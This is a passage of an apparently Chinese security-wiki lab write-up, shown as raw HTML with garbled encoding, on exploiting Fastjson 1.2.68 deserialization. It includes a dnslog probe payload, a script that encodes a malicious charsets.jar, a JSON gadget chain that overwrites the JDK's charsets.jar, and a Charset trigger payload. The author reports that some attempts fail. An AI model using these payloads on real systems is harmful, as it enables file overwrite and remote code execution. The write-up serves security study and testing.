            ret<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;success&quot;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            ret<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;data&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Hello &quot;</span> <span class="token operator">+</span> obj<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;, Your age is &quot;</span> <span class="token operator">+</span> obj<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;age&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            response<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">&quot;application/json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> ret<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Index</span> i <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        i<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428171025-25a0aiw.8b0de2d0.png" alt="image" loading="lazy">â€‹</p><h3 id="æµ‹è¯•" tabindex="-1"><a class="header-anchor" href="#æµ‹è¯•"><span>æµ‹è¯•</span></a></h3><h4 id="dnslog-éªŒè¯æ¼æ´ç¯å¢ƒ" tabindex="-1"><a class="header-anchor" href="#dnslog-éªŒè¯æ¼æ´ç¯å¢ƒ"><span><strong>dnslog éªŒè¯æ¼æ´ç¯å¢ƒ</strong></span></a></h4><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.net.InetSocketAddress&quot;</span> <span class="token punctuation">{</span>
            <span class="token property">&quot;address&quot;</span><span class="token operator">:</span> <span class="token punctuation">,</span>
            <span class="token property">&quot;val&quot;</span><span class="token operator">:</span> <span class="token string">&quot;n0cqiv.dnslog.cn&quot;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428171801-tdrkeyw.70eb63b5.png" alt="image" loading="lazy">â€‹</p><h4 id="å‹ç¼©æ¼æ´åˆ©ç”¨-jar-åŒ…" tabindex="-1"><a class="header-anchor" href="#å‹ç¼©æ¼æ´åˆ©ç”¨-jar-åŒ…"><span>å‹ç¼©<strong>æ¼æ´åˆ©ç”¨ jar</strong> åŒ…</span></a></h4><ol><li><p>ä¸‹è½½ï¼š</p><p><a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks" target="_blank" rel="noopener noreferrer">https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>å°†é¡¹ç›®ä¸­çš„ <a href="https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks/blob/main/release/charsets.jar" target="_blank" rel="noopener noreferrer">charsets.jar<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> ï¼ˆè¿™æ˜¯ LandGrey å¸ˆå‚…å‘ç°çš„æŸäº›æƒ…å†µä¸‹æ‡’åŠ è½½çš„ jar åŒ…ï¼‰</p><p>é¡¹ç›®ä¸­è¿˜åˆ—ä¸¾äº†å…¶ä»–åœºæ™¯çš„è§¦å‘ï¼Œå¦‚ spring åŸç”Ÿåœºæ™¯ã€jackson å¼€å¯ enableDefaultTyping åœºæ™¯ã€jdbc url getConnection åœºæ™¯ç­‰ã€‚</p></li><li><p>å¯¹ jar åŒ…è¿›è¡Œå‹ç¼©å¤„ç†</p></li></ol><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># åªåœ¨ centos ä¸‹èƒ½ç”¨ï¼ŒUbuntu çš„ openssl éƒ½ä¸æ‰§è¡Œ</span>
<span class="token function">cat</span> charsets.jar <span class="token operator">|</span> openssl zlib <span class="token operator">|</span> base64 <span class="token parameter variable">-w</span> <span class="token number">0</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>æˆ–è€…ä¿®æ”¹ä¹‹å‰çš„ python è„šæœ¬ï¼š<code>py .\filebase64zip.py D:\Tmp\charsets.jar</code>â€‹</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> zlib
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> base64

<span class="token comment"># æ£€æŸ¥å‘½ä»¤è¡Œå‚æ•°</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;ç”¨æ³•ï¼š{} &lt;æ–‡ä»¶è·¯å¾„&gt;&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token comment"># å°è¯•æ‰“å¼€å¹¶è¯»å–æ–‡ä»¶å†…å®¹</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è¯»å–æ–‡ä»¶æ—¶å‡ºé”™ï¼š&quot;</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># å‹ç¼©æ•°æ®</span>
<span class="token comment"># å‹ç¼©ç‡ 0 - 9</span>
<span class="token comment"># cat charsets.jar | openssl zlib | base64 -w 0</span>
<span class="token comment"># compressData = zlib.compress(data) é»˜è®¤æ˜¯ 6ï¼Œä¸ä¸Šé¢çš„å‘½ä»¤ç­‰ä»·</span>
compressData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>

<span class="token comment"># å°†å‹ç¼©æ•°æ®è½¬æ¢ä¸ºbase64ç¼–ç å­—ç¬¦ä¸²</span>
b64Str <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;utf-8&#39;</span><span class="token punctuation">)</span>

<span class="token comment"># ç§»é™¤æ‰€æœ‰æ¢è¡Œç¬¦å·</span>
<span class="token comment"># b64Str = b64Str.replace(&#39;\n&#39;, &#39;&#39;)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;å‹ç¼©åçš„æ•°æ®ï¼ˆbase64 ç¼–ç ï¼‰ï¼š &quot;</span> <span class="token operator">+</span> b64Str<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;å‹ç¼©åçš„å­—èŠ‚æ•° = &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>compressData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># è§£å‹ç¼©æ•°æ®ä»¥éªŒè¯</span>
srcData <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>compressData<span class="token punctuation">)</span>

<span class="token comment"># å¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™é‡Œä¸é‡æ–°è§£ç å’Œæ‰“å°æºæ•°æ®ï¼Œ</span>
<span class="token comment"># å› ä¸ºå®ƒå¯èƒ½åŒ…å«éæ–‡æœ¬å†…å®¹</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;è§£å‹åçš„å­—èŠ‚æ•° = &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>srcData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240430094547-ew3rvcq.8be86886.png" alt="image" loading="lazy">â€‹</p><ol start="3"><li><p>ç¡®å®š jar åŒ…è·¯å¾„</p><p>å¦‚ <strong><mark>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/</mark></strong> charsets.jar (å®æˆ˜åˆ©ç”¨æ—¶éœ€è¦é€šè¿‡å­—å…¸å»æšä¸¾ jdk ç›®å½•)</p></li></ol><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment"># æˆ‘çš„ Win</span>
C<span class="token punctuation">:</span>\App\jdk1<span class="token punctuation">.</span><span class="token number">8.0_20</span>\jre\lib
D<span class="token punctuation">:</span>\Java\JDK11\lib

<span class="token comment"># linux</span>
ls <span class="token operator">-</span>lrt <span class="token operator">/</span>etc<span class="token operator">/</span>alternatives<span class="token operator">/</span>java
<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
lrwxrwxrwx <span class="token number">1</span> root root <span class="token number">43</span> <span class="token number">4</span>æœˆ  <span class="token number">29</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">21</span> <span class="token operator">/</span>etc<span class="token operator">/</span>alternatives<span class="token operator">/</span>java <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>java
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li><p>åˆ©ç”¨ä¸Šé¢ JDK11 çš„å†™æ–‡ä»¶ gadget</p><p><strong><mark>file å‚æ•°: é¶æœºä¸Š jdk ä¸­ charsets.jar æ–‡ä»¶æ‰€åœ¨çš„å®Œæ•´è·¯å¾„ï¼ˆæ²¡æœ‰ä¹Ÿä¸å½±å“å§ï¼‰</mark></strong></p><p><strong><mark>input å‚æ•°: å³ä¸Šè¿°ç¼–ç å¤„ç†åçš„ jar åŒ…å†…å®¹</mark></strong></p></li></ol><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
        &#39;@type&#39;<span class="token operator">:</span> &#39;sun.rmi.server.MarshalOutputStream&#39;<span class="token punctuation">,</span>
        &#39;out&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
            &#39;@type&#39;<span class="token operator">:</span> &#39;java.util.zip.InflaterOutputStream&#39;<span class="token punctuation">,</span>
            &#39;out&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
                &#39;@type&#39;<span class="token operator">:</span> &#39;java.io.FileOutputStream&#39;<span class="token punctuation">,</span>
                &#39;file&#39;<span class="token operator">:</span> &#39;D<span class="token operator">:</span>/Java/JDK11/lib/charsets.jar&#39;<span class="token punctuation">,</span>
                &#39;append&#39;<span class="token operator">:</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            &#39;infl&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
                &#39;input&#39;<span class="token operator">:</span> <span class="token punctuation">{</span>
                    &#39;array&#39;<span class="token operator">:</span> &#39;jar å‹ç¼©å base64 çš„å†…å®¹&#39;<span class="token punctuation">,</span>
                    &#39;limit&#39;<span class="token operator">:</span> <span class="token number">9610</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            &#39;bufLen&#39;<span class="token operator">:</span> <span class="token number">1048576</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;protocolVersion&#39;<span class="token operator">:</span> <span class="token number">1</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428184122-a323lud.04545ad5.png" alt="image" loading="lazy">â€‹</p><p>å…¶å®è¿™é‡Œå†™æ–‡ä»¶å·²ç»æç¤ºäº†ä¸‹é¢é‡åˆ°çš„å‘ï¼Œå› ä¸ºä½†æ˜¯æˆ‘è™½ç„¶æˆåŠŸå†™å…¥æ–‡ä»¶äº†ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸€ç›´æ˜¾ç¤ºçš„ 0kbï¼Œåªæœ‰åœ¨åœæ­¢ jvm çš„æ—¶å€™æ–‡ä»¶æ‰èƒ½æ˜¾ç¤ºä¸ºæ­£å¸¸çš„å†™å…¥å¤§å°ã€‚ä¸è¿‡æˆ‘ä½†æ˜¯æ²¡åœ¨æ„ï¼Œä»¥ä¸ºåªæ˜¯ä¸€æ—¶æ²¡ç¼“å­˜è¿‡æ¥ã€‚ã€‚ã€‚</p><hr><p>è¿™é‡Œè¡¥å……ä¸€ä¸‹ jdk8 çš„ï¼Œä½†æ˜¯ä¹Ÿè¦å­˜åœ¨è°ƒè¯•ä¿¡æ¯æ‰è¡Œã€‚</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484413&amp;idx=1&amp;sn=1e6e6dc310896678a64807ee003c4965&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">å¯»æ‰¾ Fastjson 1.2.68 AutoCloseable åˆ©ç”¨é“¾(3) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484408&amp;idx=1&amp;sn=fc7230f61a248945721def0f63bab431&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">å¯»æ‰¾ Fastjson 1.2.68 AutoCloseable åˆ©ç”¨é“¾(2) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><ol start="5"><li><p>å†™å…¥æ˜¯å†™å…¥äº†ï¼Œä½†æ˜¯æ²¡æ³•è§¦å‘ï¼Œå¥½å¥‡æ€ªã€‚æ˜å¤©å†è¯•è¯•ã€‚ã€‚ã€‚</p><p><strong>ã€Maybeã€‘</strong></p></li></ol><p>Java 11 ä¸­å–æ¶ˆäº† <code>charsets.jar</code>â€‹ï¼Œè¿™æ˜¯å› ä¸º Java 9 å¼•å…¥äº†æ¨¡å—åŒ–ç³»ç»Ÿï¼ˆJigsawï¼‰ï¼Œå¹¶å¯¹ Java å¹³å°çš„ç»“æ„è¿›è¡Œäº†é‡å¤§æ”¹å˜ã€‚åœ¨ Java 9 ä¸­ï¼Œå¾ˆå¤šåŸæ¥ä½œä¸ºæ ‡å‡†åº“çš„ JAR æ–‡ä»¶è¢«æ‹†åˆ†æˆäº†æ¨¡å—ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å­—ç¬¦é›†ç¼–ç çš„æ”¯æŒã€‚å› æ­¤ï¼Œä¸å†éœ€è¦å•ç‹¬çš„ <code>charsets.jar</code>â€‹ æ–‡ä»¶ã€‚</p><p>åœ¨ Java 9 ä¹‹åçš„ç‰ˆæœ¬ä¸­ï¼Œå­—ç¬¦é›†ç¼–ç ç›¸å…³çš„ç±»éƒ½è¢«æ•´åˆåˆ°äº† <code>java.base</code>â€‹ æ¨¡å—ä¸­ï¼Œå¹¶ä¸”åŒ…å«åœ¨ JDK çš„æ ¸å¿ƒ JAR æ–‡ä»¶ä¸­ï¼Œä¸å†éœ€è¦å•ç‹¬çš„ JAR æ–‡ä»¶ã€‚è¿™ç§é‡ç»„ä½¿å¾— Java å¹³å°æ›´åŠ æ¨¡å—åŒ–å’Œè½»é‡åŒ–ï¼Œå¹¶æé«˜äº†å®‰å…¨æ€§å’Œæ€§èƒ½ã€‚</p><hr><p>æˆ‘ç›´æ¥æŠŠ jar åŒ…æ‰‹åŠ¨å¤åˆ¶æ¨¡æ‹Ÿä¸€ä¸‹è§¦å‘ï¼Œæ¢å› jdk1.8.0_20 çš„ç¯å¢ƒçœ‹çœ‹è¡Œä¸è¡Œã€‚</p><p>æ›¿æ¢ jre/lib ä¸‹çš„ charset.jar åå¯ä»¥çœ‹åˆ°è¿è¡Œ java å‘½ä»¤ jvm åŠ è½½ä¼šå¼¹å‡ºä¸¤ä¸ªè®¡ç®—å™¨ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429155812-ojrjp55.62c221ae.png" alt="image" loading="lazy">â€‹</p><p>è€Œ jdk1.8.0_281ã€jdk11 åˆ™ç›´æ¥å¯åŠ¨å¤±è´¥ï¼Œ<strong>å¯èƒ½æ˜¯å®‰å…¨æ ¡éªŒæˆ–è€…å…¶ä»–</strong>ï¼Ÿ</p><p><a href="https://stackoverflow.com/questions/7325579/java-lang-noclassdeffounderror-could-not-initialize-class-xxx" target="_blank" rel="noopener noreferrer">I was getting the same issue due to mismatch with the properties file key name and used in my code. After fixing the properties file problem got resolved<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429160039-t7ua108.ffeccc94.png" alt="image" loading="lazy">â€‹</p><hr><p>æ¥ç€æˆ‘å°è¯•å‘åŒ…é€šè¿‡ fastjson è§¦å‘è¯¥ç±»ä¹Ÿå¤±è´¥äº†ï¼Œå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ã€‚</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;java.nio.charset.Charset&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;val&quot;</span><span class="token operator">:</span><span class="token string">&quot;IBM33722&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429154413-najk868.91ef5c6b.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429154347-wea6luw.f7bb81cb.png" alt="image" loading="lazy">â€‹</p><p>æ—¢ç„¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Œä¿®æ”¹ä¸€ä¸‹ charset.jar ä¸ºå†™æ–‡ä»¶å†æµ‹è¯•ä¸€éçœ‹æ˜¯å¦ç”Ÿæ•ˆã€‚</p><h4 id="ä¿®æ”¹-jar-åŒ…" tabindex="-1"><a class="header-anchor" href="#ä¿®æ”¹-jar-åŒ…"><span>ä¿®æ”¹ jar åŒ…</span></a></h4><p>LandGrey å¸ˆå‚…æä¾›äº†æºç , æ”¹ä¸‹æ‰€è¦æ‰§è¡Œçš„å‘½ä»¤é‡æ–°ç”Ÿæˆæ¶æ„ jar åŒ…å³å¯ã€‚</p><p>è¯¦ç»†æ­¥éª¤å¦‚ä¸‹:</p><ol><li>IDEA æ–°å»ºä¸€ä¸ªåä¸º charsets çš„æ™®é€šç©ºé¡¹ç›®ï¼Œå»ºç«‹ src æ–‡ä»¶å¤¹ã€‚å°† spring-boot-upload-file-lead-to-rce-tricks-main\charsets\src ä¸‹çš„ä¸¤ä¸ªç›®å½•ï¼ˆMETA-INFã€sunï¼‰æ‹·è´è¿› src ç›®å½•ä¸‹ã€‚</li><li>çœ‹ä¸‹ IBM33722.java æ–‡ä»¶çš„æºç , å°† Windows éƒ¨åˆ†ä¸­çš„å‘½ä»¤æ”¹ä¸ºå†™æ–‡ä»¶çš„å‘½ä»¤å³å¯ã€‚</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429161228-od5mj3r.4dc4ee35.png" alt="image" loading="lazy">â€‹</p><ol start="3"><li><p>é‡æ–°æ‰“åŒ…æˆ jar åŒ…</p><p>â€‹<code>ctrl+alt+shift+s</code>â€‹ æ‰“å¼€é¡¹ç›®ç»“æ„çª—å£, é…ç½®å¦‚ä¸‹å›¾ã€‚</p><p>è·å–ç”Ÿæˆä¿®æ”¹åçš„ jar åŒ…, åé¢çš„æ“ä½œé‡å¤å‰é¢çš„æ­¥éª¤è¿›è¡Œæµ‹è¯•ã€‚</p></li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429161924-le0kify.9b6b859d.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429184352-nx92fvc.4ed4ed87.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240429184256-ayq62rq.694bfea0.png" alt="image" loading="lazy">â€‹</p><p>è¿˜æ˜¯ä¸è¡Œï¼Œ<strong><mark>æˆ‘æƒ³æ˜¯å› ä¸º Tomcat å¯åŠ¨çš„æ—¶å€™å·²ç»åŠ è½½äº†è¿™ä¸ª charsets.jar è¿™ä¸ªåŒ…ï¼Œæ‰€ä»¥åé¢ä¸é‡å¯æ˜¯ä¸ä¼šå†æ¬¡åŠ è½½çš„ã€‚</mark></strong> ç„¶è€Œé‡å¯ä¼šå› ä¸º jar åŒ…è¢«æ›¿æ¢äº† Java èµ·ä¸æ¥ä¼šå¯¼è‡´ Tomcat 